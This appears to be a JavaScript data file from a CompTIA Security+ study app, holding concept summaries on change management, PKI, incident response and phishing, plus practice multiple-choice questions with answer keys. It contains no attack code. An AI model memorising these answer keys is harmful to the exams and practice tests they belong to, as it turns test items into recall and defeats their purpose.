...
window.CERT_PACKS.secplus = {
  ...
  retentionGapConcepts: [
    ...
    // ── Phase 3 Cycle 6 retention concepts (v4.99.58, 2026-05-12) ───────────
    // 3 entries covering Change Management sub-concepts from user's morning
    // Messer session. Pair with the 10 Phase 3 Cycle 6 exemplars below.
    { label: 'Change Management Workflow',            parentTopic: 'Change Management', objective: '1.3', keyword: 'RFC submission → impact analysis + risk assessment → CAB review/approval → sandbox/staging testing → scheduled maintenance window with backout plan READY → implementation → post-implementation review (PIR). Skipping any step degrades change management to "paperwork over cowboy ops." The PIR is the learning loop — without it, the org stops getting better at change.' },
    { label: 'Ownership vs Stakeholders vs CAB',      parentTopic: 'Change Management', objective: '1.3', keyword: 'RACI-driven distinction. OWNER = single accountable person driving the change to completion (one per change, no co-owners — accountability cannot be diffused). STAKEHOLDERS = the broader set informed/consulted (affected user groups, dependent service owners, security/compliance, support teams). CAB (Change Advisory Board / Change Control Board) = the cross-functional review body that approves/rejects/defers — composition should span security, operations, business owners, technical leads, and (when relevant) compliance/legal. CAB is NOT a technical-only body.' },
    { label: 'Backout Plan as Approval Gate',         parentTopic: 'Change Management', objective: '1.3', keyword: 'Every production change requires a documented, tested BACKOUT (ROLLBACK) plan — regardless of how thorough the testing was. Testing reduces failure probability but cannot eliminate prod surprises (real data shapes, concurrent load, third-party behavior, network conditions). The backout plan is the answer to "when something goes wrong, how do we restore service?" — includes pre-change backup, scripted rollback procedure, decision time-budget, verification steps. "We tested thoroughly" is not a substitute. Also distinguish from MAINTENANCE WINDOW (the WHEN of implementation, not the recovery procedure) and from SOPs (repeatable routine procedures, not one-off change rollbacks).' },
    // ── Technical Change Management retention concepts (v7.65.0, 2026-07-10) ──
    // 5 entries covering SY0-701 1.3's TECHNICAL-implications half (allow/deny
    // lists, restricted activities, downtime + restarts, dependencies + legacy,
    // documentation + version control). Pair with the 12 exemplars below.
    { label: 'Allow List vs Deny List', parentTopic: 'Technical Change Management', objective: '1.3', keyword: 'Application-control models, and BOTH are change-management concerns. ALLOW LIST = DEFAULT-DENY: nothing runs unless explicitly approved (by file hash, digital signature, publisher, or path). Blocks unknown/novel malware by definition. Cost: high admin overhead — a legitimate update changes the hash/version, so the allow-list policy must be updated AS PART OF the change or the app silently fails to launch. DENY LIST = DEFAULT-ALLOW: everything runs unless it matches a known-bad indicator (classic signature AV). Easier to operate, less restrictive, but structurally cannot block a threat it has never seen. Exam trap: "deny listing is stronger" is FALSE — allow listing is the more restrictive/secure model.' },
    { label: 'Approved Scope & Restricted Activities', parentTopic: 'Technical Change Management', objective: '1.3', keyword: 'Approval is SPECIFIC, never a general licence to modify. An approved change names the systems in scope, the actions authorized, the personnel, and the time limits — everything else is a RESTRICTED ACTIVITY. Approval to upgrade the PRIMARY firewall does NOT authorize upgrading the secondary, deleting stale rules, replacing hardware, or touching routing. When implementation reveals unforeseen work (e.g. the app upgrade also needs a driver upgrade), the correct move is SCOPE EXPANSION THROUGH APPROVAL: pause, document the new requirement, notify the change owner, obtain expanded authorization, or invoke the backout plan. Fixing it unilaterally "because it was necessary" is uncontrolled scope creep — it bypasses the impact analysis the CAB actually performed and can invalidate the backout plan. Exam trap: "approval means permission to fix anything I discover."' },
    { label: 'Downtime, Restarts & Availability Techniques', parentTopic: 'Technical Change Management', objective: '1.3', keyword: 'Downtime primarily attacks AVAILABILITY (CIA). PLANNED downtime must be scheduled, communicated (start, duration, systems, impact, contact), minimized, and monitored. AVOIDING downtime uses redundancy: failover, ROLLING UPGRADE, blue-green deployment, HA maintenance — drain traffic off node A, upgrade + validate it, shift traffic to it, then upgrade node B. The un-upgraded node doubles as the rollback path. SERVICE RESTART / APPLICATION RESTART are their own named technical implication: many services read config only at START-UP, so a saved config file is NOT live until restart (or an explicit reload signal) — and the restart itself drops sessions, so it must be a planned, communicated, validated step in the procedure. Automation (scripts, IaC, templates) reduces human error and increases repeatability, but a faulty automated change propagates errors fast, so automation must itself be tested and approved.' },
    { label: 'Dependencies, Order & Legacy Applications', parentTopic: 'Technical Change Management', objective: '1.3', keyword: 'DEPENDENCY = something another system requires to function (web app -> database; service -> DNS; auth -> identity provider; managed firewall -> compatible management platform). ORDER MATTERS, and the rule is: derive the supported sequence from the VENDOR COMPATIBILITY MATRIX. The common case is MANAGER-FIRST — the management platform must support the version running on the managed device, so upgrading the device code first can strand it behind an incompatible manager, costing you management, monitoring, and the ability to roll back through normal tooling. Always keep out-of-band access (console/serial) as a safety net. HIDDEN (undocumented) dependencies are the dangerous ones: restarting a certificate server breaks device ENROLLMENT (issuance needs the CA online), and breaks VPN / 802.1X only where REVOCATION CHECKING (OCSP responder or CRL distribution point, usually co-hosted on the CA) becomes unreachable and relying parties hard-fail — 802.1X itself terminates at RADIUS/NPS. Dependency maps + current architecture diagrams are the countermeasure. LEGACY APPLICATION = old, often unsupported/unpatchable, but frequently BUSINESS-CRITICAL — "legacy" does NOT mean "useless". Routine estate-wide changes (TLS hardening, OS patch, password policy) can silently break them, so flag them in impact analysis. Interim posture: COMPENSATING CONTROLS — segmentation, strict firewall rules, application allow listing, restricted admin access, enhanced monitoring, limited internet exposure, more frequent backups — while replacement is planned.' },
    { label: 'Documentation, Version Control & Validation', parentTopic: 'Technical Change Management', objective: '1.3', keyword: 'A change is complete when the RECORDED state matches the ACTUAL state, not when the installer exits 0. Exam trap: "a successful installation means a successful change" is FALSE — you must VALIDATE the intended result, that security controls / logging / monitoring still function, that users can reach the service, and that no side effects hit dependent systems. Then update DOCUMENTATION as part of the change (never "next quarter"): network + data-flow diagrams, asset inventory, firewall rule and IP/DNS records, procedures, policies, system baselines, dependency maps, recovery instructions. Stale docs degrade incident response, troubleshooting, audit, DR, and — compounding — the impact analysis of every FUTURE change. VERSION CONTROL on configs/scripts/IaC gives change history, author + timestamp accountability, version diffing, approval/review workflow before merge, and restoration of an earlier known-good revision (a component of the backout plan). It does NOT make a change secure, and it does NOT remove the need for a maintenance window.' },
    { label: 'PICERL Incident Response Order', parentTopic: 'Incident Response', objective: '4.8', keyword: 'Preparation -> Identification -> Containment -> Eradication -> Recovery -> Lessons Learned. Memorize as P-I-C-E-R-L. Order is exam-tested in drag-and-drop PBQs. Preparation FIRST (cannot respond well without prep). Containment BEFORE eradication (stop spread, then remove threat). Lessons Learned LAST (drives improvement, often skipped which leaves orgs vulnerable to repeat incidents).' },
    { label: 'RTO vs RPO vs MTTR vs MTBF', parentTopic: 'Risk Management', objective: '5.2', keyword: 'BC/DR vs reliability metric distinction. RTO = max acceptable downtime (target). RPO = max acceptable data loss (target). MTTR = mean time to repair (measured statistic). MTBF = mean time between failures (measured statistic). RTO/RPO are TARGETS the org sets. MTTR/MTBF are MEASURED statistics about hardware. Confusing these four is a classic exam trap.' },
    { label: 'DMARC + DKIM + SPF email-trio', parentTopic: 'Email & Web Security', objective: '4.5', keyword: 'Domain anti-spoofing trio. SPF (Sender Policy Framework) = which servers are authorized to SEND from this domain (IP-based, TXT record). DKIM (DomainKeys Identified Mail) = cryptographic SIGNATURE on the message body (verifies integrity). DMARC = POLICY on what to do when SPF/DKIM fail alignment (none / quarantine / reject) + reporting. Together they detect + act on domain spoofing in inbound email.' },
    { label: 'Tactical vs Operational vs Strategic Threat Intel', parentTopic: 'Attack Vectors & Surfaces', objective: '2.2', keyword: 'Three threat intelligence tiers, distinguished by consumer + content. Tactical = TTPs and IOCs (analyst consumers - hashes, IPs, signatures). Operational = campaign context and adversary tooling (responder consumers - kill chains, TTPs in context). Strategic = business risk and adversary motivation (executive consumers - geopolitical risk, sector trends). VoC S12 surprise - ExamTopics flagged this as confusable.' },
    { label: 'Certificate Format Families', parentTopic: 'PKI & Certificate Management', objective: '1.4', keyword: 'Cert file format distinctions. PEM = base64 ASCII (.pem/.crt) - human-readable, most common. DER = binary (.der/.cer) - compact, common on Windows. PFX/P12 (PKCS#12) = public + private key + chain in ONE password-protected file (.pfx/.p12) - for importing into Windows/macOS keychains. P7B (PKCS#7) = chain ONLY, no private key (.p7b). Exam tests choosing the right format for the use case.' },
    { label: 'AAA Framework', parentTopic: 'Identity & Access Management', objective: '4.6', keyword: 'Three-pillar identity framework. Authentication = WHO you are (verify identity via password, MFA, biometrics, cert). Authorization = WHAT you can do (permissions, RBAC/ABAC/MAC/DAC decision). Accounting = WHAT you did (audit log, session tracking). Often implemented as RADIUS / TACACS+ services. Exam stems mix these - identify which pillar is being tested.' },
    { label: 'Risk Math: ALE = SLE × ARO', parentTopic: 'Risk Management', objective: '5.2', keyword: 'Fundamental quantitative-risk formula. SLE (Single Loss Expectancy) = $ cost of one loss event. ARO (Annualized Rate of Occurrence) = how many times per year. ALE (Annualized Loss Expectancy) = SLE × ARO = expected yearly $ loss. Drives risk-treatment cost-benefit: spending more than ALE on mitigation per year is net-negative. Also Exposure Factor (EF) = % of asset value lost per event; SLE = Asset Value × EF.' },
    { label: 'OWASP Top 3 Web App Risks', parentTopic: 'Application Vulnerabilities', objective: '2.3', keyword: 'OWASP Top 10 current top 3: 1. Broken Access Control (auth checks missing/bypassable). 2. Cryptographic Failures (weak/missing encryption, exposed sensitive data). 3. Injection (SQLi, LDAP, OS-command injection - tainted input executed as code). Each maps to distinct mitigations: access control = central authorization, principle of least privilege; crypto failures = TLS + at-rest encryption + key management; injection = parameterized queries + input validation + output encoding.' },
    { label: 'Blockchain & Open Public Ledger', parentTopic: 'Cryptography Fundamentals', objective: '1.4', keyword: 'Two 1.4 bullets, tested at recognition level. Blockchain = distributed ledger where each block carries the PREVIOUS block\'s hash, so altering an accepted record changes its digest, breaks every later link, and is rejected by consensus. Property delivered = INTEGRITY (plus non-repudiation via per-transaction digital signatures, and availability via replication across nodes). Property NOT delivered = CONFIDENTIALITY — an open public ledger is readable by all participants, addresses are pseudonymous not anonymous, so sensitive data belongs off-chain with only a hash on-chain. Two flagged traps: (1) "immutable" means tamper-EVIDENT, not physically unalterable; (2) integrity of the record ≠ truth of the claim — a signed false entry is preserved perfectly ("garbage in, immutable garbage out"). Not cryptocurrency-specific: supply chain, identity, audit and ownership records are the exam\'s usual framing.' },
    // ── Certificates lesson (v8.12.0, 2026-07-31) — 4 entries covering the 1.4
    // certificate bullets the existing PKI exemplars + retention entries miss.
    // Exemplars were NOT added: D1 has zero headroom under the domain-distribution
    // guard, and PKI & Certificate Management already holds 6 exemplars while
    // _pickExemplarsForTopic slices to 3, so a 7th would never be selected.
    { label: 'CSR — what is sent and what never leaves', parentTopic: 'PKI & Certificate Management', objective: '1.4', keyword: 'Certificate Signing Request. Applicant generates the key pair FIRST, then sends a CSR containing the PUBLIC key plus subject/organisation details, self-signed with the matching private key to prove possession. The PRIVATE KEY NEVER LEAVES THE APPLICANT — never in the CSR, never to the CA, never in the issued certificate. CA validates (DNS record, verification email, web-file placement, or organisation documents), then signs the certificate with the CA\'s private key; the applicant installs the returned cert on the server. Two flagged traps: (1) "the applicant sends the private key in the CSR" — wrong, and it is the classic distractor; (2) "the certificate contains the private key" — wrong, an X.509 cert carries the public key. Related but distinct: a PFX/P12 bundle DOES contain the private key, which is why it is password-protected — that is a storage format, not the CSR or the certificate.' },
    { label: 'SAN vs Wildcard certificates', parentTopic: 'PKI & Certificate Management', objective: '1.4', keyword: 'Two different ways to cover more than one name, routinely confused. SAN (Subject Alternative Name) = an X.509 EXTENSION listing additional specific identities — DNS names, IP addresses, email addresses — and can span entirely different domains (www.example.com + mail.example.net). Wildcard = a single asterisk label, *.example.com, covering many subdomains. Wildcard limits the exam tests: (1) ONE label level only — *.example.com matches mail.example.com but NOT server.mail.example.com; (2) it does not automatically cover the bare root domain example.com, which must be listed separately as a SAN. Security tradeoff worth knowing: one wildcard private key deployed across many servers means a single compromise exposes every service using it, so separate certificates buy isolation at the cost of management overhead. Hostname matching is what browsers actually check — the visited name must match the Subject or one of the SAN entries.' },
    { label: 'Revocation: CRL vs OCSP vs OCSP Stapling', parentTopic: 'PKI & Certificate Management', objective: '1.4', keyword: 'Three answers to "is this certificate still trusted?", distinguished by WHO does the work. CRL = client DOWNLOADS a CA-published list of revoked serial numbers; simple and offline-checkable, but the file grows large and the data is only as fresh as the last publication. OCSP = client ASKS an OCSP responder about ONE certificate and gets good / revoked / unknown; current, but adds a network round trip, loads the CA, fails awkwardly when the responder is down, and leaks the client\'s browsing to the responder. OCSP STAPLING = the SERVER periodically fetches a CA-SIGNED status response and attaches ("staples") it to the TLS handshake; removes the client-to-CA request entirely, so it is faster, scales better and restores client privacy. Flagged trap: stapling does NOT mean the server vouches for itself — the stapled response carries the CA\'s digital signature, which the client verifies. Second trap: expiration is not revocation. A certificate inside its validity window can still be revoked (key compromise, mis-issuance, ownership change), which is exactly why revocation checking exists.' },
    { label: 'Public vs Private CA + chain of trust', parentTopic: 'PKI & Certificate Management', objective: '1.4', keyword: 'Public/third-party CA = its root certificate already ships in browser and OS trust stores, so external users trust the certificate with no action; used for public HTTPS, e-commerce, public APIs. Private/internal CA (AD Certificate Services, enterprise PKI, cloud private CA) = the organisation issues its own certificates for internal sites, domain controllers, VPN and Wi-Fi authentication, device and user certs, code signing. Flagged trap: a private CA is NOT automatically trusted — the organisation must DISTRIBUTE its root certificate to every device\'s trust store, or users get certificate warnings. Validation path: end-entity certificate signed by an Intermediate CA, intermediate signed by the Root CA, root already present in the trust store. Intermediates exist so the root can stay offline; a root compromise invalidates every certificate beneath it. Flagged trap: the root does NOT sign end-entity certificates directly in normal enterprise or public PKI. Remember the CA operation is SIGNING, not encrypting — it provides authentication, integrity and trust, not confidentiality of the site\'s traffic.' },
    ...
    { label: 'The emotional levers and the out-of-band check', parentTopic: 'Social Engineering', objective: '2.2', keyword: 'Phishing works by making the target react emotionally instead of checking carefully. The levers: URGENCY ("within 15 minutes"), FEAR — the classical principle name is INTIMIDATION ("your account is compromised", "to avoid prosecution"), GREED ("you have received a refund"), AUTHORITY ("the CEO needs this now"), TRUST/FAMILIARITY (a borrowed brand or colleague identity), CURIOSITY ("confidential salary list"), SYMPATHY ("please donate"), plus two more from CompTIA\'s classical persuasion list: SOCIAL PROOF/CONSENSUS ("everyone else on the team has already confirmed") and SCARCITY ("only three licence renewals left"). Spotting the lever is often faster than spotting the forgery — any message engineered to make you act before you think deserves a second look regardless of how clean it appears. The defence that defeats the whole family: OUT-OF-BAND VERIFICATION — confirm the request over a DIFFERENT channel the attacker does not control, using contact details you ALREADY HOLD, never ones supplied in the message ("call the CEO back on the number on file", not the number in the email signature). It matters most where technical checks legitimately pass: in the supplier invoice-swap BEC, the mail leaves the supplier\'s real mailbox, SPF and DKIM succeed, the invoice is genuine and only the account number changed — a standing rule that every change to payment details is verified out-of-band against contact details already on file — with dual approval of payment changes as its natural companion — is the class of control that dependably still works. Related mechanical tells worth pairing with the levers: lookalike domains (typosquatting — paypa1 with a digit 1), pixel-perfect copied login pages (brand impersonation), a Reply-to that differs from the sender domain, and a post-theft redirect to the real site so the victim blames a typo and never reports.' },
  ...
  topicDomains: {
    ...
    'Technical Change Management':       'concepts', // 1.3 — technical implications: allow/deny lists, restricted activities, downtime, restarts, dependencies, legacy apps, documentation, version control
    ...
    'Obfuscation':                      'concepts', // 1.4 — steganography, tokenization, data masking
  ...
  topicResources: {
    ...
    'Technical Change Management':       { obj: '1.3', title: 'Technical Change Management', search: 'professor+messer+SY0-701+technical+change+management' },
    ...
    'Obfuscation':                      { obj: '1.4', title: 'Obfuscation (Steganography, Tokenization, Masking)', search: 'professor+messer+SY0-701+obfuscation+steganography+tokenization+data+masking' },
  ...
  questionExemplars: [
    ...
    // ── Phase 3 Cycle 6 — Change Management (v4.99.58, 2026-05-12) ──────────
    // 10 exemplars across 4 clusters covering all 11 sub-concepts from user's
    // morning Messer session: change management process, change approval flow,
    // CAB, RFC form, ownership, stakeholders, impact analysis + risk, testing/
    // sandboxing, backout/rollback plan, maintenance window, and SOPs. Pair
    // with the 3 Phase 3 Cycle 6 retention concepts above.
    //
    // Cluster A — Governance & Roles (CAB · Ownership vs Stakeholders · Approval flow)
    {"type":"mcq","question":"Your organization is restructuring its change-management process. A senior engineer argues that the Change Advisory Board (CAB) should consist exclusively of senior infrastructure engineers because 'they are the ones who understand the technology.' Which response BEST aligns with security-program best practice for CAB composition?","difficulty":"Exam Level","topic":"Change Management","objective":"1.3","options":{"A":"Agree — CAB should be technical-only because only engineers can evaluate technical risk","B":"Disagree — CAB should be CROSS-FUNCTIONAL (security, operations, business owners, technical leads, and compliance/legal when relevant) so that technical, business, security, and compliance impacts are all weighed before approval","C":"Disagree — CAB should be made up only of executives and managers because they have ultimate accountability","D":"Agree but expand — CAB should include all engineers across every team, not just infrastructure, so every team has a vote"},"answer":"B","explanation":"A CAB's purpose is to evaluate proposed changes from MULTIPLE angles: technical feasibility, business impact, security risk, compliance/regulatory implications, customer-facing disruption, contractual SLAs. A technical-only CAB systematically blind-spots non-technical risks — business-hour customer impact, regulatory reporting requirements, support-staff readiness, downstream service dependencies. CompTIA-aligned best practice is cross-functional CAB membership with security, operations, business owners, and technical leads (plus compliance/legal when applicable). (A) and (D) over-rotate to technical depth. (C) confuses ACCOUNTABILITY (which often sits with executive sponsors via RACI) with the REVIEW/EVALUATION function that the CAB performs. SY0-701 Domain 1.3 + 5.1 trap: CAB ≠ engineering review meeting.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"mcq","question":"A change-management policy requires that every proposed change identify both a change OWNER and the relevant STAKEHOLDERS. A junior analyst asks why they can't just list everyone with an interest as 'co-owners.' Which response BEST explains the OWNERSHIP vs STAKEHOLDER distinction?","difficulty":"Exam Level","topic":"Change Management","objective":"1.3","options":{"A":"They are synonyms — using both terms is redundant in modern change management","B":"The OWNER is the SINGLE accountable party who drives the change to completion and answers for the outcome; STAKEHOLDERS are the broader set who need to be INFORMED or CONSULTED but are not individually accountable","C":"The OWNER is always the executive sponsor; STAKEHOLDERS are everyone below them in the org chart","D":"STAKEHOLDERS approve; OWNERS execute"},"answer":"B","explanation":"This is the RACI-driven distinction at the heart of change governance. There is exactly ONE OWNER per change — the single accountable individual who drives the work, communicates with the CAB, monitors implementation, and answers for the outcome. STAKEHOLDERS are the wider set with a legitimate interest: affected user groups, dependent service owners, security/compliance, support teams, downstream consumers. They are CONSULTED before approval and/or INFORMED after implementation. Treating stakeholders as co-owners DIFFUSES accountability — if everyone is responsible, no one is. (A) Wrong — distinct roles. (C) Wrong — the owner is the person driving the change day-to-day, not necessarily the executive sponsor (who may approve funding but not run the work). (D) Wrong — approval is typically the CAB's role; ownership is about accountability for the change itself.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"mcq","question":"A new IT team is establishing its change-management process. Which of the following BEST describes the typical phase ORDER of a formal change from earliest to latest?","difficulty":"Foundational","topic":"Change Management","objective":"1.3","options":{"A":"Submit RFC → CAB review → Implementation → Backout plan creation → Post-implementation review","B":"Backout plan creation → Submit RFC → Implementation → CAB review → Post-implementation review","C":"Submit RFC → Impact analysis + risk assessment → CAB review/approval → Testing in sandbox/staging → Implementation in maintenance window → Post-implementation review (PIR)","D":"Implementation → Submit RFC (retroactive) → CAB review → Post-implementation review → Backout planning"},"answer":"C","explanation":"The correct order is process-fundamental for SY0-701 Domain 1.3 + 5.1. Submit the Request for Change (RFC) → perform impact analysis + risk assessment so the CAB has data to evaluate → CAB reviews and approves/rejects/defers → testing in a sandbox/staging environment that mirrors production → scheduled implementation during a maintenance window WITH THE BACKOUT PLAN READY → post-implementation review (PIR) to confirm success and capture lessons. (A) Wrong — the backout plan must be created BEFORE approval (it's a precondition the CAB evaluates), not after implementation. (B) Wrong — backout planning comes after RFC submission, and CAB review must happen BEFORE implementation. (D) Wrong — implementing first and seeking approval retroactively is the canonical 'cowboy ops' anti-pattern that change management exists to prevent.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},

    // Cluster B — Documentation Discipline (RFC form components · SOPs)
    {"type":"multi-select","question":"(Choose THREE) Your team is designing a Request for Change (RFC) form template that will be submitted to the Change Advisory Board (CAB) for every production change. Which of the following pieces of information should be REQUIRED fields on the RFC form to enable a meaningful CAB review?","difficulty":"Hard","topic":"Change Management","objective":"1.3","options":{"A":"Description of the proposed change AND business justification ('why are we doing this?')","B":"Identified change OWNER (single accountable person) and STAKEHOLDERS (informed/consulted parties)","C":"The brand of coffee preferred by the implementing engineer","D":"Impact analysis (scope, dependencies, risk assessment) AND a documented BACKOUT/ROLLBACK PLAN","E":"The first name of every employee in the company"},"answers":["A","B","D"],"explanation":"The CAB's job is to make a risk-informed approval decision. They need: (A) WHAT is changing and WHY — without business justification, every change becomes a discretionary tweak with no priority anchoring; (B) WHO is responsible (single owner) and WHO is affected (stakeholders) — accountability + communication plan; (D) IMPACT + ROLLBACK — the impact analysis lets the CAB weigh the risk against the benefit, and the backout plan is the canonical safety-net that distinguishes professional change management from cowboy ops. (C) and (E) are absurd distractors and should NEVER appear on RFCs — keep personal/non-functional metadata off governance forms. SY0-701 Domain 1.3 trap: an RFC without an explicit backout plan is INCOMPLETE BY DEFINITION; CABs should reject it back to the owner rather than approve and 'figure it out later.'","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"mcq","question":"A security operations team performs the same set of steps every time a new server is provisioned: install hardening baseline, configure the EDR agent, register the asset in the inventory, apply the relevant firewall rules, and enroll it in the patch-management system. They document these steps in a controlled, version-managed document and require every technician to follow it on every provisioning. Which security-program element is BEST described?","difficulty":"Exam Level","topic":"Change Management","objective":"1.3","options":{"A":"Standard Operating Procedure (SOP)","B":"Request for Change (RFC)","C":"Disaster Recovery Plan (DRP)","D":"Business Impact Analysis (BIA)"},"answer":"A","explanation":"A Standard Operating Procedure (SOP) is a controlled, version-managed document that defines the EXACT, REPEATABLE steps for a routine operational task. The scenario describes a textbook SOP — server provisioning is routine, the steps are deterministic, the document is version-controlled, and adherence is mandatory across technicians. SOPs enable: (1) CONSISTENCY (same outcome regardless of who performs the task), (2) AUDITABILITY (the document is the standard against which actual practice is measured), (3) ONBOARDING SPEED (new hires follow the document, not a senior engineer's memory). (B) RFC is a one-time document proposing a SPECIFIC NON-ROUTINE change; the difference is repeatable vs one-off. (C) DRP covers catastrophic-failure RECOVERY at the system/site level. (D) BIA quantifies the business impact of disruptions. Key SY0-701 distinction: SOPs are for REPEATABLE ROUTINE operations; RFCs are for individual non-routine changes that need CAB approval.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},

    // Cluster C — Pre-implementation Discipline (Impact analysis · Testing/Sandboxing · Backout plan)
    {"type":"mcq","question":"An organization is preparing to implement a major change: migrating the corporate email system from on-prem Exchange to Microsoft 365. A junior analyst submits an impact analysis that consists of: 'Affected systems: email server. Risk: low.' The CAB rejects this analysis as incomplete. Which of the following BEST describes the elements a thorough IMPACT ANALYSIS should contain?","difficulty":"Exam Level","topic":"Change Management","objective":"1.3","options":{"A":"SCOPE (which systems, users, business processes, and third-party integrations are affected), RISK (data-loss/downtime/compliance risk with likelihood × impact rating), and DEPENDENCIES (upstream systems the change relies on and downstream systems that rely on the changing component)","B":"Only the technical systems directly modified","C":"Only the financial cost of the change","D":"Only the timeline and the implementation engineer's name"},"answer":"A","explanation":"A meaningful impact analysis lets the CAB weigh the change against alternatives and conditions. It must capture: (1) SCOPE — every system, user group, business process, and third-party integration affected (the email migration above touches end-users, mobile devices, mailflow with vendors, calendar integrations, SSO, archiving/eDiscovery, SIEM log feeds — not just 'the email server'); (2) RISK — explicit failure modes with likelihood × impact ratings (data loss during cutover? Authentication outage? Compliance reporting gaps? Vendor email-delivery degradation?); (3) DEPENDENCIES — what services have to be touched/migrated in sequence (DNS records, MX records, SPF/DKIM/DMARC, hybrid coexistence period, downstream SIEM/archive integrations). (B), (C), (D) are partial views — none alone enables a CAB to make a defensible approval decision. The junior's '1 system, low risk' analysis is the canonical anti-example: the CAB should reject and return with specific scope/risk/dependency gaps to fill.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"mcq","question":"Your team is preparing to deploy a kernel security patch to all 500 production Linux servers. Best practice mandates that the patch be TESTED before production rollout. Which of the following BEST describes the appropriate TESTING/SANDBOXING approach?","difficulty":"Foundational","topic":"Change Management","objective":"1.3","options":{"A":"Apply the patch directly to all production servers, then watch for problems and roll back if needed","B":"Apply the patch to a SANDBOX or STAGING environment that mirrors production configuration, validate behavior against a defined test plan, and only proceed to production after passing tests","C":"Apply the patch to the first server alphabetically and assume the remaining 499 will behave identically","D":"Apply the patch only when it is also a SECURITY UPDATE, treating that as an emergency exception that bypasses testing"},"answer":"B","explanation":"Sandbox/staging testing is the canonical pre-production safety mechanism in change management. The sandbox environment should mirror production configuration as closely as possible — same OS version, same dependent services, same data shapes, same load profile — so test results PREDICT production behavior. The team defines a TEST PLAN with expected outcomes (services restart correctly, no kernel panics in the first N hours, application health checks pass, performance baselines unchanged), validates the patch against the plan, and only then proceeds to production. (A) 'Test in prod' defeats the purpose of testing and is a common 'we tested by deploying' anti-pattern. (C) Single-server alphabetical rollout still skips defined-test-plan validation and assumes homogeneity that rarely holds. (D) Emergency security patches still require testing — the 'emergency change' process is a SEPARATE ACCELERATED workflow (often with CAB-chair-only approval), NOT a bypass of testing entirely. Even in emergencies, a smoke test in a representative environment beats blind production deployment.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"mcq","question":"Your CAB has approved a database schema change for tomorrow night's maintenance window. The change OWNER notes in the RFC that 'no backout plan is needed because we've tested thoroughly.' Which response BEST reflects security-program best practice?","difficulty":"Exam Level","topic":"Change Management","objective":"1.3","options":{"A":"Approve the change as-is — if testing was thorough, a backout plan is redundant overhead","B":"REJECT the change and require a documented, tested BACKOUT (ROLLBACK) plan before re-submission — no production change should proceed without a way back to the previous good state, regardless of test confidence","C":"Approve the change but assign a senior engineer on standby to 'figure it out' if anything breaks during implementation","D":"Approve only schema-additive changes (adding columns) and reject schema-subtractive changes (dropping columns) under the same testing posture"},"answer":"B","explanation":"A backout (rollback) plan is a NON-NEGOTIABLE element of every production change, regardless of test confidence. Testing reduces the probability of failure but cannot eliminate it — production carries surprises that staging cannot reproduce: real data shapes (long-tail edge cases), real concurrent load, real third-party-service behavior, real network conditions, real OS-level differences. The backout plan answers 'when (not if) something goes wrong, how do we restore service?'. For a database schema change, a complete backout plan typically includes: pre-change schema + data backup, scripted rollback SQL, time-budget for the rollback decision (e.g., 'if not stable in 30 min, roll back'), communication plan for users and stakeholders, and post-rollback verification steps. (A) 'We tested thoroughly' is a comforting assumption no defensible CAB accepts — it converts thorough testing into a substitute for safety net, which it isn't. (C) 'Figure it out under pressure' IS the absence of a plan. (D) Schema-additive vs subtractive is a legitimate risk gradient but does NOT substitute for a backout plan — even additive changes can fail (lock timeouts, replication lag, application-incompatible types).","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},

    // Cluster D — Operational scheduling + synthesis (Maintenance window · Complete change record)
    {"type":"mcq","question":"Your organization schedules a MAINTENANCE WINDOW from 02:00–05:00 UTC every Sunday for production changes. Which of the following BEST describes WHY production changes are scheduled into a defined maintenance window rather than being applied at any time?","difficulty":"Foundational","topic":"Change Management","objective":"1.3","options":{"A":"Engineers prefer working at night for personal reasons","B":"To MINIMIZE user-facing impact, ensure on-call coverage and CAB representation are staffed and aware, BATCH related changes to limit overall disruption, and COMMUNICATE expected service degradation in advance","C":"To reduce data-center electricity cost via off-peak power rates","D":"To avoid CAB approval requirements during normal business hours"},"answer":"B","explanation":"Maintenance windows serve four operational goals: (1) MINIMIZE USER IMPACT — align the work with periods of lowest user activity (overnight UTC for global SaaS, weekends for office-hours apps); (2) ENSURE COVERAGE — the on-call rotation, change implementers, CAB representatives, and stakeholders can be staged and aware in advance; (3) BATCH CHANGES — bundle multiple smaller changes into one disruption window rather than spreading downtime across the week; (4) COMMUNICATE EXPECTATIONS — users, customers, and downstream service consumers know when degradation may occur and plan around it. (A) Misses the operational rationale — personal preference is not a governance principle. (C) Power-cost savings is incidental at best. (D) Maintenance windows DO NOT bypass CAB approval — every change still needs an RFC and CAB review; the maintenance window is just the agreed WHEN of implementation, not a governance shortcut.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},
    {"type":"multi-select","question":"(Choose THREE) Your CAB chair asks you to audit a sample of completed Change Records to assess whether they meet the organization's change-management policy. Which of the following are MANDATORY ELEMENTS of a complete change record that should be present in every entry?","difficulty":"Hard","topic":"Change Management","objective":"1.3","options":{"A":"RFC with description, business justification, change owner, and stakeholders identified","B":"Impact analysis (scope, risk, dependencies) and a documented, tested backout plan","C":"The implementation engineer's astrological sign","D":"CAB approval record (or documented emergency-change approval) AND a post-implementation review (PIR) confirming success or capturing failure lessons","E":"The brand of the engineer's laptop and the make of their car"},"answers":["A","B","D"],"explanation":"A complete change record tells the full lifecycle story and stands up to audit: (A) WHAT was proposed — the RFC with description, business justification, owner, stakeholders identified; (B) WHY it was SAFE TO APPROVE — impact analysis (scope/risk/dependencies) plus a tested backout plan; (D) HOW it was GOVERNED AND RESOLVED — CAB approval record (or documented emergency-change approval path) plus post-implementation review (PIR) confirming success or capturing failure lessons. The PIR is the most-skipped element under deadline pressure but is the mechanism by which the org LEARNS from each change — what went well, what didn't, what to do differently. Skipping PIR turns change management into a paperwork ritual rather than a continuous-improvement loop. (C) and (E) are absurd distractors — personal/non-functional metadata should never appear in governance records. SY0-701 synthesis trap: an auditor asking 'where is the PIR?' on a successful change is a real failure mode many orgs have.","source":"curated-secplus-phase3","addedVersion":"4.99.58","addedDate":"2026-05-12"},

    // ── Technical Change Management (v7.65.0, 2026-07-10) ─────────────────
